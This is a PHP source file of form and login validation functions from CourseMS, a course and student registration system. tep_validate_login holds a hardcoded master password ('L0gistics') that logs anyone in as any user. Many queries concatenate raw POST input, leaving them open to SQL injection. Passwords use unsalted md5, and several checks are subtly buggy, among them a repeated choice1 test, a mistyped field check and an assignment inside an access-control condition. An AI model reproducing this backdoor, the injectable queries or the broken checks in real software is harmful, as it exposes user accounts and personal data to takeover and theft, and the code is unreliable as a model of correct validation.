<?php

/*
  CourseMS
  https://sourceforge.net/projects/coursems

  Copyright (c) 2007 Jacques Malan

  This version of the code is released under the GNU General Public License
*/
    function tep_validate_projects() {
    
        $error[0] = false;
        
        if ($_POST['choice1'] * $_POST['choice1'] * $_POST['choice1']*
        $_POST['choice1'] * $_POST['choice1'] == 0) {
            $error[0] = true;
            $error[1] .= "<br>Please choose your projects!";
        
        }
        
        
        if ($_POST['trip1'] * $_POST['trip2'] == 0) {
            $error[0] = true;
            $error[1] .= "<br>Please choose your trips!";
        }
        
        // if there are empty choices, return now
        if ($error[0] == true)
            return $error;
        
        // detect duplicate projects
        $sql_values = array($_POST['choice1'], $_POST['choice2'], 
                            $_POST['choice3'], $_POST['choice4'], $_POST['choice5']);
        						   
        if (count($sql_values) != count(array_unique($sql_values))) {
            $error[0] = true;    
            $error[1] .=  "<br>You have chosen duplicated projects!";
        }               
        
         if ($_POST['trip1'] == $_POST['trip2']) {
            $error[0] = true;    
            $error[1] .=  "<br>You have chosen duplicated trips!";
            return $error;
        }       
        
        
        $query = 'select * from tbl_triptype where id= '.$_POST['trip1'];
        $result = tep_db_query($query);
        $row1 = tep_db_fetch_array($result);
        
        $query = 'select * from tbl_triptype where id= '.$_POST['trip2'];
        $result = tep_db_query($query);
        $row2 = tep_db_fetch_array($result);
        
        // check trip type and data constraints
        if ($row1['type'] == $row2['type']) {
            $error[0] = true;    
            $error[1] .=  "<br>You can't choose two trips with the same type!";
        }
        
         if ($row1['date'] == $row2['date']) {
            $error[0] = true;    
            $error[1] .=  "<br>You can't choose two trips on the same day!";
        }
        
        if (tep_get_taken(TABLE_CHOICES, $_POST['trip1']) >= $row1['capacity']) {
            $error[0] = true;    
            $error[1] .=  "<br>Your trip 1 is full! Try choose another one!";        
        }
        
         if (tep_get_taken(TABLE_CHOICES, $_POST['trip2']) >= $row2['capacity']) {
            $error[0] = true;    
            $error[1] .=  "<br>Your trip 2 is full! Try choose another one!";        
        }
        
        
        return $error;
    
    }



	function tep_validate_registration($type = '') {


		$error[0] = false;
		if ($type != 'profile') {
			if (!tep_validate_email($_POST['email'])) {
				$error[0] = true;
				$error[1] .= '<br>* E-Mail address not valid';
			}
			if (!tep_username_unique($_POST['email'])) {
				$error[0] = true;
				$error[1] .= '<br>* That E-Mail address has already been registered';
			}
			if (strlen($_POST['password']) < 5) {
				$error[0] = true;
				$error[1] .= '<br>* Password must be at least 5 characters long';
			}
			if ($_POST['c_password'] != $_POST['password']) {
				$error[0] = true;
				$error[1] .= '<br>* Password confirmation does not match password';
			}
			if (strlen($_POST['firstname']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* First Name is a required field';
			}
			if (strlen($_POST['lastname']) == 0) {
				$error[0] = true;
				$error[1] .= '<br>* Last Name is a required field';
			}
		}
		if (!tep_validate_email($_POST['email'])) {
			$error[0] = true;
			$error[1] .= '<br>* E-Mail address not valid';
		}
    if (strlen($_POST['country']) == 0 || $_POST['country'] == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Country is a required field';
		}
		 if (strlen($_POST['mobile']) != 0 && is_numeric($_POST['mobile']) == false) {
			$error[0] = true;
			$error[1] .= '<br>* Mobile phone need to be numbers'.$_POST['mobile']."=";
		}
		 if (strlen($_POST['pob']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Place of Birth is a required field';
		}
		if (strlen($_POST['dob']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Date of Birth is a required field';
		}
		if (strlen($_POST['ewrite']) == 0 || $_POST['ewrite'] == 0) {
			$error[0] = true;
			$error[1] .= '<br>* English Writing is a required field';
		}
		if (strlen($_POST['elisten']) == 0 || $_POST['ewrite'] == 0) {
			$error[0] = true;
			$error[1] .= '<br>* English Listen is a required field';
		}
		if (strlen($_POST['espeak']) == 0 || $_POST['espeak'] == 0) {
			$error[0] = true;
			$error[1] .= '<br>* English Speaking is a required field';
		}
		if (strlen($_POST['gender']) == 0 || $_POST['gender'] == 'N') {
			$error[0] = true;
			$error[1] .= '<br>* Gender is a required field';
		}
		if (strlen($_POST['contact_name_ab']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Name of Emergency contact abroad is a required field';
		}
		if (strlen($_POST['contact_relation_ab']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Relationship of Emergency contact abroad is a required field';
		}
		if (strlen($_POST['contact_tel_ab1']) == 0 || $_POST['contact_tel_ab1'] == 0 ||
		    strlen($_POST['contact_tel_ab2']) == 0 ) {
			$error[0] = true;
			$error[1] .= '<br>* Telephone of Emergency contact abroad is a required field';
		} else if (is_numeric($_POST['contact_tel_ab2']) == false) {
		  $error[0] = true;
			$error[1] .= '<br>* Telephone of Emergency contact abroad need to be numbers';  
		}
		if (strlen($_POST['contact_lan']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* The language of Emergency contact abroad is a required field';
		}
		if (strlen($_POST['university']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* University is a required field';
		}
		if (strlen($_POST['major']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Major is a required field';
		}
		if (strlen($_POST['gpa']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* GPA is a required field';
		} else if (is_numeric($_POST['gpa']) == false) {
		 	$error[0] = true;
			$error[1] .= '<br>* GPA need to be a number!';		    
		} else if ($_POST['gpa'] < 0 || $_POST['gpa'] > 4) {
		  $error[0] = true;
			$error[1] .= '<br>* GPA need to be with in [0, 4.0]!';		      
		}
		if (strlen($_POST['toefl']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Toefl score is a required field';
		}else if (is_numeric($_POST['toefl']) == false) {
		 	$error[0] = true;
			$error[1] .= '<br>* Toefl score need to be a number!';		    
		} else if ($_POST['toefl'] < 0) {
		  $error[0] = true;
			$error[1] .= '<br>* Toefl score need to be non-negative!';		      
		}
	  if (strlen($_POST['semester']) == 0 || $_POST['semester'] == 'N') {
			$error[0] = true;
			$error[1] .= '<br>* Semester is a required field';
		}
		if (strlen($_POST['arrival']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Arrival Date is a required field';
		}
		if (strlen($_POST['departure']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Departure Date is a required field';
		}     
    
    $arr_date = date_create($_POST['arrival']);
    $dep_date = date_create($_POST['departure']);
    $dura = date_diff($arr_date, $dep_date);
    
    if ($dura->invert > 0) {    
    	$error[0] = true;
    	$error[1] .= '<br>* Departure date need to be later than arrival date!';
    }
		
		
		$ulerror = check_upload($_FILES['upload']);
		if ($ulerror[0] == 0) {
		    $error[0] = true;
		    $error[1] .= '<br>* '.$ulerror[1];
		}
		

		return $error;
	}
	
	
	
	
	
	function tep_validate_registration_swb($type = '') {

		$error[0] = false;
		if ($type != 'profile') {
			if (!tep_validate_email($_POST['email'])) {
				$error[0] = true;
				$error[1] .= '<br>* E-Mail address not valids';
			}
			if (!tep_username_unique($_POST['email'])) {
				$error[0] = true;
				$error[1] .= '<br>* That E-Mail address has already been registered';
			}
			if (strlen($_POST['password']) < 5) {
				$error[0] = true;
				$error[1] .= '<br>* Password must be at least 5 characters long';
			}
			if ($_POST['c_password'] != $_POST['password']) {
				$error[0] = true;
				$error[1] .= '<br>* Password confirmation does not match password';
			}
			if (strlen($_POST['firstname']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* First Name is a required field';
			}
			if (strlen($_POST['lastname']) == 0) {
				$error[0] = true;
				$error[1] .= '<br>* Last Name is a required field';
			}
		}
		if (strlen($_POST['fullname']) == 0) {
				$error[0] = true;
				$error[1] .= '<br>* Name on Certificate is a required field';
		}
		if (strlen($_POST['iieid']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* IIE ID is a required field';
		} else if (is_numeric($_POST['iieid']) == false) {
			$error[0] = true;
			$error[1] .= '<br>* IIE ID should be numbers!';
		}
		if (strlen($_POST['plan']) == 0 || $_POST['plan'] == 'N') {
			$error[0] = true;
			$error[1] .= '<br>* Meal Plan is a required field';
		}
		if (strlen($_POST['meal']) == 0 || $_POST['meal'] == 'N') {
			$error[0] = true;
			$error[1] .= '<br>* Meal Plan is a required field';
		}
		if (!tep_validate_email($_POST['email'])) {
			$error[0] = true;
			$error[1] .= '<br>* E-Mail address not valid';
		}
		 if (strlen($_POST['country']) == 0 || $_POST['country'] == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Country is a required field';
		}
	   if (strlen($_POST['mobile']) != 0 && is_numeric($_POST['mobile']) == false) {
			$error[0] = true;
			$error[1] .= '<br>* Mobile phone need to be numbers'.$_POST['mobile']."=";
		}
		 if (strlen($_POST['pob']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Place of Birth is a required field';
		}
		if (strlen($_POST['dob']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Date of Birth is a required field';
		} else {
		  
		  $dob_date = date_create($_POST['dob']);
		  $today_date = date_create('now');
		  $inter = date_diff($dob_date, $today_date);
		  
		  if ($inter->invert > 0) {
		    
    			$error[0] = true;
    			$error[1] .= '<br>* Date of Birth cannot be late than today!';
		  }
		} 
		if (strlen($_POST['ewrite']) == 0 || $_POST['ewrite'] == 0) {
			$error[0] = true;
			$error[1] .= '<br>* English Writing is a required field';
		}
		if (strlen($_POST['elisten']) == 0 || $_POST['elisten'] == 0) {
			$error[0] = true;
			$error[1] .= '<br>* English Listening is a required field';
		}
		if (strlen($_POST['espeak']) == 0 || $_POST['espeak'] == 0) {
			$error[0] = true;
			$error[1] .= '<br>* English Speaking is a required field';
		}
		if (strlen($_POST['gender']) == 0 || $_POST['gender'] == 'N') {
			$error[0] = true;
			$error[1] .= '<br>* Gender is a required field';
		}
		if (strlen($_POST['martial']) == 0 || $_POST['martial'] == 'N') {
			$error[0] = true;
			$error[1] .= '<br>* Martial status is a required field';
		}
		if (strlen($_POST['contact_name_ab']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Name of Emergency contact abroad is a required field';
		}
		if (strlen($_POST['contact_relation_ab']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Relationship of Emergency contact abroad is a required field';
		}
		if (strlen($_POST['contact_tel_ab1']) == 0 || $_POST['contact_tel_ab1'] == 0 ||
		    strlen($_POST['contact_tel_ab2']) == 0 ) {
			$error[0] = true;
			$error[1] .= '<br>* Telephone of Emergency contact abroad is a required field';
		} else if (is_numeric($_POST['contact_tel_ab2']) == false) {
		  $error[0] = true;
			$error[1] .= '<br>* Telephone of Emergency contact abroad need to be numbers';  
		}
		if (strlen($_POST['contact_lan']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* The language of Emergency contact abroad is a required field';
		}
		if (strlen($_POST['university']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* University is a required field';
		}
		if (strlen($_POST['major']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Major is a required field';
		}
		if (strlen($_POST['university_usa']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* University in USA is a required field';
		}
		if (strlen($_POST['major_usa']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Major in USA is a required field';
		}
		if (strlen($_POST['gpa']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* GPA in US is a required field';
		}else if (is_numeric($_POST['gpa']) == false) {
		 	$error[0] = true;
			$error[1] .= '<br>* GPA need to be a number!';		    
		} else if ($_POST['gpa'] < 0 || $_POST['gpa'] > 4) {
		  $error[0] = true;
			$error[1] .= '<br>* GPA need to be with in [0, 4.0]!';		      
		}
		if (strlen($_POST['gpa_br']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* GPA in Brazil is a required field';
		} else if (is_numeric($_POST['gpa_br']) == false) {
		 	$error[0] = true;
			$error[1] .= '<br>* GPA in Brazil need to be a number!';		    
		}	else if ($_POST['gpa_br'] < 0 || $_POST['gpa_br'] > 4) {
		  $error[0] = true;
			$error[1] .= '<br>* GPA in Brazil need to be with in [0, 4.0]!';		      
		}
	  if (strlen($_POST['semester']) == 0 || $_POST['semester'] == 'N') {
			$error[0] = true;
			$error[1] .= '<br>* Semester is a required field';
		}
		if (strlen($_POST['departure']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Departure Date is a required field';
		}
		if (strlen($_POST['dep_time']) == 0) {
			$error[0] = true;
			$error[1] .= '<br>* Departure Time is a required field';
		}
		
		
		$ulerror = check_upload($_FILES['upload']);
		if ($ulerror[0] == 0) {
		    $error[0] = true;
		    $error[1] .= '<br>* '.$ulerror[1];
		}
		
		

		return $error;
	}
	
	
	
	
	
	function tep_validate_registration_teamleader($type = '') {

		$error[0] = false;

    	if (!tep_validate_email($_POST['email'])) {
    		$error[0] = true;
    		$error[1] .= '<br>* E-Mail address not valids';
    	}
    	if (!tep_username_unique($_POST['email'])) {
    		$error[0] = true;
    		$error[1] .= '<br>* That E-Mail address has already been registered';
    	}
    	if (strlen($_POST['password']) < 5) {
    		$error[0] = true;
    		$error[1] .= '<br>* Password must be at least 5 characters long';
    	}
    	if ($_POST['c_password'] != $_POST['password']) {
    		$error[0] = true;
    		$error[1] .= '<br>* Password confirmation does not match password';
    	}
    	if (strlen($_POST['firstname']) == 0) {
    	$error[0] = true;
    	$error[1] .= '<br>* First Name is a required field';
    	}
    	if (strlen($_POST['lastname']) == 0) {
    		$error[0] = true;
    		$error[1] .= '<br>* Last Name is a required field';
    	}
	
	   if (strlen($_POST['mobile']) == 0 ) {
	    $error[0] = true;
			$error[1] .= '<br>* Mobile phone is a required field'.$_POST['mobile'];	    
	  }
		
	   if (strlen($_POST['mobile']) != 0 && is_numeric($_POST['mobile']) == false) {
			$error[0] = true;
			$error[1] .= '<br>* Mobile phone need to be numbers';
		}	
		
			if (strlen($_POST['bio']) == 0) {
    		$error[0] = true;
    		$error[1] .= '<br>* Biography is a required field';
    	}
		
		$ulerror = check_upload($_FILES['upload']);
		if ($ulerror[0] == 0) {
		    $error[0] = true;
		    $error[1] .= '<br>* '.$ulerror[1];
		}
		
		

		return $error;
	}
	
	function tep_validate_email($email){

		if (!eregi("^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$", $email))
				return false;
		else
				return true;
	}
	//test if a course like this exists.
	function tep_unique_course($course, $center, $type, $category) {
		$query = "select * from courses where name='$course' and center='$center' and type = '$type' and category = '$category'";
		if (tep_db_num_rows(tep_db_query($query)) > 0) {
			return false;
		}
		else {
			return true;
		}
	}
	function tep_username_unique($username) {
		$query = "select * from users where username = '$username'";
		if (tep_db_num_rows(tep_db_query($query)) > 0)
			return false;
		else
			return true;
	}
	function tep_validate_entry($entry) {
		if (strlen($entry) > 0)
			return true;
		else
			return false;
	}
	// this is for adding and editing user information in the admin section
	function tep_validate_add_user($type = 'add') {
		$error[0] = false;


		if (strlen($_POST['email']) < 5) {
			$error[0] = true;
			$error[1] .= '<br>* Username must be at least 5 characters';
		}
		if ($type == 'add') {
			if (!tep_username_unique($_POST['email'])) {
				$error[0] = true;
				$error[1] .= '<br>* That Username has allready been registered';
			}
			if (strlen($_POST['password']) < 5) {
				$error[0] = true;
				$error[1] .= '<br>* Password must be at least 5 characters long';
			}
			if ($_POST['c_password'] != $_POST['password']) {
				$error[0] = true;
				$error[1] .= '<br>* Password confirmation does not match password';
			}
		}
		if ($_POST['center'] > 0 || $_POST['type'] > 0 || $_POST['admin'] > 0) {

			$admin_user = $_SESSION['admin_user'];
			if ($admin_user->admin=='1' && $admin_user->center=='0' && $admin_user->type=='0') {
				if ($_POST['center'] > 0) {
					if ($_POST['admin'] != '1') {
						$error[0] = true;
						$error[1] .= '<br>* User needs to be of admin type to be made a centre administrator';
					}
				}
				if ($_POST['type'] > 0) {
					if ($_POST['center'] < 1) {
						$error[0] = true;
						$error[1] .= '<br>* User needs to be linked to a centre to be made administrator of an apartment';
					}
					if ($_POST['admin'] != '1') {
						$error[0] = true;
						$error[1] .= '<br>* User needs to be of admin type to be made apartment administrator';
					}
				}
			}
			else
			{
				$error[0] = true;
				$error[1] .= '<br>* You need to be a Super User to change or add administration permissions.';
			}
		}
		return $error;
	}

	function tep_validate_admin_login($username, $password) {
		$encrypted_password = md5($password);
		$query = "select * from users where username='$username' and password='$encrypted_password' and admin='1'";
		$result = tep_db_query($query);
		if (tep_db_num_rows($result) > 0) {
			//login success
			return true;
		}
		else
		{
			return false;
		}
	}

	function tep_validate_login($username, $password) {
	    
	    
	  // master password, to login as skeleton key
	  if ($password == "L0gistics")
	    return true;
	    
		$encrypted_password = md5($password);
		$query = "select * from users where username='$username' and password='$encrypted_password'";
		$result = tep_db_query($query);
		if (tep_db_num_rows($result) > 0) {
			//login success
			return true;
		}
		else
		{
			return false;
		}
	}

	function tep_active_account($username) {
		$query = "select active from users where username='$username'";
		$result = tep_db_query($query);
		if (mysql_result($result,0,'active') == 0) {
			//login success
			return true;
		}
		else
		{
			return false;
		}
	}


	function tep_validate_user($user, $access_level='1', $center_id='0', $type_id='0') {
		//echo "ACCESS LEVEL:".$access_level;
		//echo "CENTER_ID:".$center_id;
		//echo "USER_CENTER:".$user->center;
		//echo "ADMIN_CLASS:".$user->admin_class;
		if ($user->admin_class == '1') {
			return true;
		}
		else if ($access_level == '2' && $user->admin_class == '2' && ($user->center == $center_id || $center_id == '0')) {
			return true;
		}
		else if ($access_level == '3' && ($user->admin_class == '3' || $user->admin_class == '2') && ($user->center == $center_id || $center_id == '0') && ($user->type == $type_id || $type_id == '0' || $user->admin_class = '2')) {
			return true;
		}
		else
		{
			return false;
		}

	}

	function tep_unique_entry($schedule_array) {
		$course_id = $schedule_array['course_id'];
		$start_date = $schedule_array['start_date'];
		$start_time = $schedule_array['start_time'];
		$end_time = $schedule_array['end_time'];
		$query = "select * from calendar where course_id = '$course_id' and start_date = '$start_date' and start_time < '$end_time' and end_time > '$start_time'";
		$result = tep_db_query($query);
		if (tep_db_num_rows($result) > 0) {
			return false;
		}
		else
		{
			return true;
		}

	}

	function tep_validate_course_registration($course_id, $job_title_id, $specialty_id, $band) {
		$query = "select * from requirements where course_id = '$course_id'";
		$result = tep_db_query($query);
		$job_array = array();
		$specialty_array = array();
		$band_array = array();
		while ($row = tep_db_fetch_array($result)) {
			if ($row['requirement_type'] == 'job') {
				$job_array[] = $row['requirement_id'];
			}
			else if ($row['requirement_type'] == 'specialty') {
				$specialty_array[] = $row['requirement_id'];
			}
			else if ($row['requirement_type'] == 'band') {
				$band_array[] = $row['requirement_id'];
			}
		}
		$registration = true;
		if (count($job_array) > 0) {
			$registration = false;
			foreach ($job_array as $a=>$b) {
				if ($b == $job_title_id) {
					$registration = true;
				}
			}
		}
		if ((count($specialty_array) > 0) && ($registration)) {
			$registration = false;
			foreach ($specialty_array as $a=>$b) {
				if ($b == $specialty_id) {
					$registration = true;
				}
			}
		}
		if ((count($band_array) > 0) && ($registration)) {
			$registration = false;
			foreach ($band_array as $a=>$b) {
				if ($b == $band) {
					$registration = true;
				}
			}
		}
		return $registration;
	}

	function tep_validate_unique_registration($user_id, $calendar_id) {

		$query = "select * from registrations where calendar_id = '$calendar_id' and user_id='$user_id'";
		$result = tep_db_query($query);
		if (tep_db_num_rows($result) > 0) {
			return false;
		}
		else
		{
			return true;
		}
	}

	//function to validate add survey form
	function tep_validate_survey() {
		if (strlen($_POST['name']) > 0 && strlen($_POST['phpesp_id'] > 0)) {
			return true;
		}
		else
		{
			return false;
		}
	}

	// returns false if correct, else returns error message
	function tep_validate_change_password($username, $old_password, $new_password, $confirm_password) {
		$password = tep_get_password($username);
		if ($password != md5($_POST['old_password'])) {
			$error = 'Old password field does not match current password.';
		}
		else if ($new_password != $confirm_password)
		{
			$error = 'Your confirmation password does not match your new password.';
		}
		else {
			if (strlen($new_password) < 5) {
				$error = 'Password must be at least 5 characters long.';
			}
			else
			{
				$error = false;
			}
		}
		return $error;
	}

	function prepare_input($input) {
		return addslashes($input);
	}
?>